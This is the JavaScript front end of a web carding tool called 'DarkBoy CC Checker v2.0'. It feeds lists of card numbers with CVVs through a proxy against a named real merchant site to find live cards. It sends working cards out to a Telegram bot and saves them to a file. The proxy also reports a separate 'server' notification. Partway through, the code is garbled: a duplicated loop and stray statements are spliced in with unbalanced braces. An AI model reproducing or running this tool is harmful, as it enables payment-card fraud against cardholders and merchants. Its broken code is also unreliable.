// Global variables
let isProcessing = false;
let currentProcessor = null;
let stats = { total: 0, approved: 0, declined: 0, charged: 0, errors: 0 };
let approvedCards = [];
let botToken = '';
let chatId = '';

// Load saved settings on page load
document.addEventListener('DOMContentLoaded', () => {
    loadTelegramSettings();
    addTerminalMessage('🚀 Welcome to DarkBoy CC Checker v2.0 - Web Edition', 'info');
    addTerminalMessage('💡 Load credit cards and start checking for live validation', 'info');
});

// Telegram Settings Functions
function saveTelegramSettings() {
    botToken = document.getElementById('botToken').value.trim();
    chatId = document.getElementById('chatId').value.trim();
    
    if (!botToken || !chatId) {
        showAlert('Please enter both bot token and chat ID', 'error');
        return;
    }
    
    // Save to localStorage
    localStorage.setItem('cc_checker_bot_token', botToken);
    localStorage.setItem('cc_checker_chat_id', chatId);
    
    showAlert('Telegram settings saved successfully!', 'success');
}

function loadTelegramSettings() {
    const savedToken = localStorage.getItem('cc_checker_bot_token');
    const savedChatId = localStorage.getItem('cc_checker_chat_id');
    
    if (savedToken && savedChatId) {
        document.getElementById('botToken').value = savedToken;
        document.getElementById('chatId').value = savedChatId;
        botToken = savedToken;
        chatId = savedChatId;
    }
}

async function testTelegramConnection() {
    const testToken = document.getElementById('botToken').value.trim();
    const testChatId = document.getElementById('chatId').value.trim();
    
    if (!testToken || !testChatId) {
        showAlert('Please enter both bot token and chat ID first', 'error');
        return;
    }
    
    try {
        const testMessage = `🧪 **Connection Test Successful!**\n\n` +
            `✅ DarkBoy CC Checker v2.0 is connected\n` +
            `🕐 Test Time: ${new Date().toLocaleString()}\n` +
            `🔔 You will receive notifications for approved cards\n\n` +
            `🚀 Happy checking!`;
        
        const response = await fetch(`https://api.telegram.org/bot${testToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: testChatId,
                text: testMessage,
                parse_mode: 'Markdown'
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            showAlert('Test message sent successfully! Check your Telegram.', 'success');
        } else {
            showAlert(`Test failed: ${result.description}`, 'error');
        }
    } catch (error) {
        showAlert(`Test failed: ${error.message}`, 'error');
    }
}

// Main Processing Functions
async function startProcessing() {
    const ccInput = document.getElementById('ccInput').value.trim();
    const ccList = ccInput.split('\n').filter(cc => cc.trim());
    
    if (ccList.length === 0) {
        showAlert('Please enter credit cards to check', 'error');
        return;
    }
    
    isProcessing = true;
    stats = { total: 0, approved: 0, declined: 0, charged: 0, errors: 0 };
    approvedCards = [];
    
    // Update UI
    document.getElementById('startBtn').disabled = true;
    document.getElementById('stopBtn').disabled = false;
    
    // Clear previous results
    clearResults();
    updateAllStats();
    
    addTerminalMessage('🚀 Starting CC Checker processing...', 'info');
    addTerminalMessage(`📊 Total CCs to check: ${ccList.length}`, 'info');
    addTerminalMessage('🔄 Initializing validation process...', 'info');
    
    // Process cards
    await processCreditCards(ccList);
}

function stopProcessing() {
    isProcessing = false;
    document.getElementById('startBtn').disabled = false;
    document.getElementById('stopBtn').disabled = true;
    addTerminalMessage('⏹️ Processing stopped by user', 'warning');
}

// Update the processCreditCards function to use the new Vercel API endpoint

async function processCreditCards(ccList) {
    for (let i = 0; i < ccList.length && isProcessing; i++) {
        const cc = ccList[i].trim();
        if (!cc) continue;
        
        updateProgress(i + 1, ccList.length);
        addTerminalMessage(`🔄 Processing: ${cc}`, 'processing');
        
        try {
            // Call Vercel API proxy instead of PHP
            const response = await fetch('/api/proxy', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    cc: cc,
                    site: 'buildersdiscountwarehouse.com.au'
                })
            });
            
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`HTTP ${response.status}: ${errorText}`);
            }
            
            const result = await response.json();
            processApiResponse(cc, result);
            
        } catch (error) {
            console.error('Request failed:', error);
            handleError(cc, error.message);
        }
        
        updateAllStats();
        
        // Delay between requests
        if (isProcessing) {
            await new Promise(resolve => setTimeout(resolve, 1500));
        }
    }
    
    if (isProcessing) {
        processingComplete();
    }
}

// Updated processApiResponse function to handle all responses properly
function processApiResponse(cc, result) {
    stats.total++;
    
    // Get response message and status
    const responseMessage = result.response || result.message || result.error || 'Unknown response';
    const status = (result.status || '').toLowerCase();
    
    console.log('Processing result:', { cc: cc.substring(0,4) + '****', status, response: responseMessage });
    
    // Categorize the response
    const category = categorizeResponseNew(result);
    let isSuccess = false;
    
    // Update stats based on category
    switch (category) {
        case 'charged':
            stats.charged++;
            isSuccess = true;
            break;
        case 'approved':
            stats.approved++;
            isSuccess = true;
            break;
        case 'threed':
            stats.threed++;
            isSuccess = true;
            break;
        case 'declined':
        default:
            stats.declined++;
            isSuccess = false;
            break;
    }
    
    // Log result to terminal with proper formatting
    const emoji = getEmojiForCategory(category);
    const categoryText = category.toUpperCase();
    const statusText = result.status ? ` (${result.status})` : '';
    
    addTerminalMessage(
        `${emoji} ${categoryText}${statusText}: ${cc} - ${responseMessage}`, 
        isSuccess ? 'success' : 'error'
    );
    
    // Add to appropriate results section
    addResultNew(cc, responseMessage, category, result.status, isSuccess);
    
    // Log Telegram notifications if any
    if (result.telegram_notifications) {
        const { user, server } = result.telegram_notifications;
        
        if (user.sent) {
            addTerminalMessage('📱 User Telegram notification sent', 'success');
        } else if (user.error) {
            addTerminalMessage(`📱 User notification failed: ${user.error}`, 'warning');
        }
        
        if (server.sent) {
            addTerminalMessage('🔧 Server Telegram notification sent', 'success');
        } else if (server.error) {
            addTerminalMessage(`🔧 Server notification failed: ${server.error}`, 'warning');
        }
    }
}

// New categorization function that handles the API response format
function categorizeResponseNew(result) {
    if (!result) return 'declined';
    
    const status = (result.status || '').toLowerCase();
    const message = (result.response || result.message || '').toLowerCase();
    
    // Check status field first
    if (status === 'charged' || status === 'success') {
        return 'charged';
    }
    
    if (status === 'approved') {
        return 'approved';
    }
    
    // Check response message for specific patterns
    // Charged/Success responses
    const chargedKeywords = [
        'thank you', 'payment successful', 'transaction approved', 'charge created',
        'payment processed', 'completed', 'charged', 'payment charged', 'success'
    ];
    
    if (chargedKeywords.some(keyword => message.includes(keyword))) {
        return 'charged';
    }
    
    // Live card indicators (CVV errors, insufficient funds, etc.)
    const approvedKeywords = [
        'insufficient_funds', 'insufficient funds',
        'incorrect_cvv', 'invalid_cvv', 'security code is incorrect',
        'incorrect_cvc', 'invalid_cvc', 'cvc is incorrect', 'cvv',
        'incorrect_zip', 'postal code', 'zip code',
        'expired', 'card_expired', 'expiry'
    ];
    
    if (approvedKeywords.some(keyword => message.includes(keyword))) {
        return 'approved';
    }
    
    // 3D Secure
    const threedKeywords = [
        '3d', '3ds', 'three-d', 'authentication', 'verify', 'redirect'
    ];
    
    if (threedKeywords.some(keyword => message.includes(keyword))) {
        return 'threed';
    }
    
    // Everything else is declined
    return 'declined';
}

// Updated addResult function to show more details
function addResultNew(cc, response, category, status, isSuccess) {
    // Determine which container based on success
    let containerId;
    if (category === 'approved' || category === 'charged' || category === 'threed') {
        containerId = 'approvedResults';
    } else {
        containerId = 'declinedResults';
    }
    
    const container = document.getElementById(containerId);
    if (!container) return;
    
    const div = document.createElement('div');
    div.className = `result-item result-${category}`;
    
    const emoji = getEmojiForCategory(category);
    const categoryText = category.toUpperCase();
    const statusText = status ? ` (${status})` : '';
    
    div.innerHTML = `
        <div style="font-weight: bold; margin-bottom: 8px; display: flex; align-items: center; gap: 8px;">
            <span>${emoji}</span>
            <span>${cc}</span>
            <span style="font-size: 0.8em; background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 4px;">
                ${categoryText}${statusText}
            </span>
        </div>
        <div style="font-size: 0.85em; color: var(--text-secondary); line-height: 1.4;">
            <div style="margin-bottom: 4px;"><strong>Response:</strong> ${response}</div>
            <div style="margin-bottom: 4px;"><strong>Gateway:</strong> Auto Shopify</div>
            <div><strong>Time:</strong> ${new Date().toLocaleString()}</div>
        </div>
    `;
    
    container.appendChild(div);
    
    // Add to approved cards if it's a success
    if (isSuccess) {
        approvedCards.push({
            cc: cc,
            category: category,
            response: response,
            status: status,
            time: new Date().toLocaleString()
        });
    }
}

// Helper function to get emoji for category
function getEmojiForCategory(category) {
    switch (category) {
        case 'charged': return '💳';
        case 'approved': return '✅';
        case 'threed': return '🔒';
        case 'declined': return '❌';
        default: return '❓';
    }
}

// Update the stats to include 3D secure
function updateAllStats() {
    document.getElementById('totalStat').textContent = stats.total;
    document.getElementById('approvedStat').textContent = stats.approved;
    document.getElementById('chargedStat').textContent = stats.charged;
    document.getElementById('declinedStat').textContent = stats.declined;
    document.getElementById('errorStat').textContent = stats.errors;
    
    // Calculate success rate (approved + charged + threed)
    const successCount = stats.approved + stats.charged + (stats.threed || 0);
    const successRate = stats.total > 0 ? (successCount / stats.total * 100).toFixed(1) : 0;
    document.getElementById('rateStat').textContent = successRate + '%';
    
    document.getElementById('approvedCount').textContent = successCount;
    document.getElementById('declinedCount').textContent = stats.declined + stats.errors;
}

// Initialize threed stat if not exists
if (!stats.threed) {
    stats.threed = 0;
}
    // Log result
    const emoji = getEmojiForCategory(category)
    const categoryText = category.toUpperCase();
    addTerminalMessage(`${emoji} ${categoryText}: ${cc} - ${responseMessage}`, 
                      isSuccess ? 'success' : 'error');
    
    // Add to results
    addResult(cc, responseMessage, category, isSuccess);
    
    // Send Telegram notification for approved cards
    if (isSuccess && botToken && chatId) {
    for (let i = 0; i < ccList.length && isProcessing; i++) {
        const cc = ccList[i].trim();
        if (!cc) continue;
        
        updateProgress(i + 1, ccList.length);
        addTerminalMessage(`🔄 Processing: ${cc}`, 'processing');
        
        try {
            // Call Vercel API proxy with user's Telegram credentials
            const response = await fetch('/api/proxy', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    cc: cc,
                    site: 'buildersdiscountwarehouse.com.au',
                    userBotToken: botToken, // User's bot token
                    userChatId: chatId      // User's chat ID
                })
            });
            
            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`HTTP ${response.status}: ${errorText}`);
            }
            
            const result = await response.json();
            
            // Log Telegram notification results
            if (result.telegram_notifications) {
                const { user, server } = result.telegram_notifications;
                
                if (user.sent) {
                    addTerminalMessage('📱 User notification sent successfully', 'success');
                } else if (user.error) {
                    addTerminalMessage(`📱 User notification failed: ${user.error}`, 'warning');
                }
                
                if (server.sent) {
                    addTerminalMessage('🔧 Server notification sent successfully', 'success');
                } else if (server.error) {
                    addTerminalMessage(`🔧 Server notification failed: ${server.error}`, 'warning');
                }
            }
            
            processApiResponse(cc, result);
            
        } catch (error) {
            console.error('Request failed:', error);
            handleError(cc, error.message);
        }
        
        updateAllStats();
        
        // Delay between requests
        if (isProcessing) {
            await new Promise(resolve => setTimeout(resolve, 1500));
        }
    }
    
    if (isProcessing) {
        processingComplete();
    }
}

// Remove the old sendTelegramNotification function since it's now handled server-side
// Just keep the processApiResponse function as is, but remove any client-side Telegram calls
    }
}

function handleError(cc, errorMsg) {
    stats.total++;
    stats.errors++;
    stats.declined++;
    addTerminalMessage(`⚠️ ERROR: ${cc} - ${errorMsg}`, 'error');
    addResult(cc, errorMsg, 'declined', false);
}

async function sendTelegramNotification(cc, response, category) {
    try {
        const emoji = category === 'charged' ? '💳' : '✅';
        const message = `${emoji} **${category.toUpperCase()} CARD DETECTED**\n\n` +
            `💳 **Card:** \`${cc}\`\n` +
            `🔧 **Gateway:** Auto Shopify\n` +
            `📝 **Response:** ${response}\n` +
            `📊 **Category:** ${category.toUpperCase()}\n` +
            `⏰ **Time:** ${new Date().toLocaleString()}\n` +
            `📈 **Session Stats:** ${stats.approved + stats.charged}/${stats.total}\n\n` +
            `🚀 **DarkBoy CC Checker v2.0**`;
        
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (error) {
        console.log('Telegram notification failed:', error);
    }
}

// UI Update Functions
function addTerminalMessage(message, type = 'info') {
    const terminal = document.getElementById('terminal');
    const timestamp = new Date().toLocaleTimeString();
    const div = document.createElement('div');
    
    let color = '#8b949e'; // default
    if (type === 'success') color = '#238636';
    else if (type === 'error') color = '#da3633';
    else if (type === 'warning') color = '#bf8700';
    else if (type === 'processing') color = '#58a6ff';
    
    div.innerHTML = `<span style="color: #6b7280;">[${timestamp}]</span> <span style="color: ${color};">${message}</span>`;
    terminal.appendChild(div);
    terminal.scrollTop = terminal.scrollHeight;
}

function updateProgress(current, total) {
    const percentage = total > 0 ? (current / total) * 100 : 0;
    document.getElementById('progressFill').style.width = percentage + '%';
    document.getElementById('progressText').textContent = `Processing... ${current} / ${total} (${percentage.toFixed(1)}%)`;
}

function updateAllStats() {
    document.getElementById('totalStat').textContent = stats.total;
    document.getElementById('approvedStat').textContent = stats.approved;
    document.getElementById('chargedStat').textContent = stats.charged;
    document.getElementById('declinedStat').textContent = stats.declined;
    document.getElementById('errorStat').textContent = stats.errors;
    
    const successCount = stats.approved + stats.charged;
    const successRate = stats.total > 0 ? (successCount / stats.total * 100).toFixed(1) : 0;
    document.getElementById('rateStat').textContent = successRate + '%';
    
    document.getElementById('approvedCount').textContent = successCount;
    document.getElementById('declinedCount').textContent = stats.declined + stats.errors;
}

function addResult(cc, response, category, isSuccess) {
    const container = isSuccess ? 
        document.getElementById('approvedResults') : 
        document.getElementById('declinedResults');
    
    const div = document.createElement('div');
    div.className = `result-item result-${category}`;
    
    const emoji = category === 'charged' ? '💳' : (isSuccess ? '✅' : '❌');
    const categoryText = category.toUpperCase();
    
    div.innerHTML = `
        <div style="font-weight: bold; margin-bottom: 5px;">
            ${emoji} ${cc}
        </div>
        <div style="font-size: 0.85em; color: var(--text-secondary);">
            <strong>Status:</strong> ${categoryText}<br>
            <strong>Response:</strong> ${response}<br>
            <strong>Time:</strong> ${new Date().toLocaleString()}
        </div>
    `;
    
    container.appendChild(div);
    
    if (isSuccess) {
        approvedCards.push({
            cc: cc,
            category: category,
            response: response,
            time: new Date().toLocaleString()
        });
    }
}

function processingComplete() {
    isProcessing = false;
    document.getElementById('startBtn').disabled = false;
    document.getElementById('stopBtn').disabled = true;
    
    const successCount = stats.approved + stats.charged;
    const successRate = stats.total > 0 ? (successCount / stats.total * 100).toFixed(1) : 0;
    
    addTerminalMessage(`🏁 Processing Complete!`, 'success');
    addTerminalMessage(`📊 Final Results: Total: ${stats.total} | ✅ Approved: ${stats.approved} | 💳 Charged: ${stats.charged} | ❌ Declined: ${stats.declined} | ⚠️ Errors: ${stats.errors} | 📈 Success Rate: ${successRate}%`, 'info');
    
    if (successCount > 0) {
        saveApprovedCards();
        showAlert(`Found ${successCount} working cards! Success rate: ${successRate}%`, 'success');
    } else {
        showAlert('Processing completed. No working cards found in this batch.', 'info');
    }
}

// Utility Functions
function clearResults() {
    document.getElementById('terminal').innerHTML = '';
    document.getElementById('approvedResults').innerHTML = '';
    document.getElementById('declinedResults').innerHTML = '';
    document.getElementById('progressFill').style.width = '0%';
    document.getElementById('progressText').textContent = 'Ready to start - 0 / 0';
}

function clearInput() {
    if (confirm('Are you sure you want to clear all credit card inputs?')) {
        document.getElementById('ccInput').value = '';
    }
}

function loadCCFile() {
    document.getElementById('fileInput').click();
}

function handleFileLoad(event) {
    const file = event.target.files[0];
    if (!file) return;
    
    const reader = new FileReader();
    reader.onload = function(e) {
        const content = e.target.result;
        const lines = content.split('\n').filter(line => {
            const trimmed = line.trim();
            return trimmed && trimmed.includes('|');
        });
        
        if (lines.length > 0) {
            document.getElementById('ccInput').value = lines.join('\n');
            showAlert(`Loaded ${lines.length} credit cards from file`, 'success');
        } else {
            showAlert('No valid credit card format found in file', 'error');
        }
    };
    reader.readAsText(file);
}

function copyResults(type) {
    let textToCopy = '';
    if (type === 'approved') {
        textToCopy = approvedCards.map(card => card.cc).join('\n');
    } else {
        // For declined, we need to extract from the UI since we don't store them
        const declinedContainer = document.getElementById('declinedResults');
        const results = Array.from(declinedContainer.children);
        textToCopy = results.map(result => {
            const ccMatch = result.innerHTML.match(/\d{13,19}\|\d{2}\|\d{2,4}\|\d{3,4}/);
            return ccMatch ? ccMatch[0] : '';
        }).filter(cc => cc).join('\n');
    }
    
    if (textToCopy) {
        navigator.clipboard.writeText(textToCopy).then(() => {
            showAlert(`Copied ${textToCopy.split('\n').length} cards to clipboard`, 'success');
        }).catch(() => {
            // Fallback for older browsers
            const textarea = document.createElement('textarea');
            textarea.value = textToCopy;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            showAlert(`Copied ${textToCopy.split('\n').length} cards to clipboard`, 'success');
        });
    } else {
        showAlert(`No ${type} cards to copy`, 'error');
    }
}

function saveApprovedCards() {
    if (approvedCards.length === 0) return;
    
    const timestamp = new Date().toISOString().split('T')[0] + '_' + 
                     new Date().toTimeString().split(' ')[0].replace(/:/g, '-');
    
    let content = `═══════════════════════════════════════════════\n`;
    content += `🚀 DARKBOY CC CHECKER v2.0 - APPROVED CARDS\n`;
    content += `═══════════════════════════════════════════════\n`;
    content += `📅 Generated: ${new Date().toLocaleString()}\n`;
    content += `📊 Total Approved: ${approvedCards.length}\n`;
    content += `═══════════════════════════════════════════════\n\n`;
    
    // Group by category
    const categories = {};
    approvedCards.forEach(card => {
        if (!categories[card.category]) {
            categories[card.category] = [];
        }
        categories[card.category].push(card);
    });
    
    Object.keys(categories).forEach(category => {
        const emoji = category === 'charged' ? '💳' : '✅';
        content += `${emoji} ${category.toUpperCase()} CARDS (${categories[category].length} found)\n`;
        content += `─────────────────────────────────────────\n`;
        
        categories[category].forEach((card, index) => {
            content += `${index + 1}. ${card.cc}\n`;
            content += `   📝 Response: ${card.response}\n`;
            content += `   ⏰ Time: ${card.time}\n\n`;
        });
    });
    
    content += `═══════════════════════════════════════════════\n`;
    content += `🎯 End of Report - All cards validated successfully\n`;
    content += `❤️ Generated by DarkBoy CC Checker v2.0\n`;
    content += `═══════════════════════════════════════════════\n`;
    
    // Download file
    const blob = new Blob([content], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `darkboy_approved_${timestamp}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
    
    addTerminalMessage(`💾 Auto-saved ${approvedCards.length} approved cards to ${a.download}`, 'success');
}

function showAlert(message, type = 'info') {
    // Create alert element
    const alert = document.createElement('div');
    alert.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 15px 20px;
        border-radius: 8px;
        color: white;
        font-weight: 600;
        z-index: 10000;
        max-width: 400px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        transform: translateX(100%);
        transition: transform 0.3s ease;
    `;
    
    // Set background color based on type
    if (type === 'success') {
        alert.style.backgroundColor = '#238636';
    } else if (type === 'error') {
        alert.style.backgroundColor = '#da3633';
    } else if (type === 'warning') {
        alert.style.backgroundColor = '#bf8700';
    } else {
        alert.style.backgroundColor = '#58a6ff';
    }
    
    alert.textContent = message;
    document.body.appendChild(alert);
    
    // Animate in
    setTimeout(() => {
        alert.style.transform = 'translateX(0)';
    }, 100);
    
    // Auto remove after 4 seconds
    setTimeout(() => {
        alert.style.transform = 'translateX(100%)';
        setTimeout(() => {
            if (alert.parentNode) {
                alert.parentNode.removeChild(alert);
            }
        }, 300);
    }, 4000);
}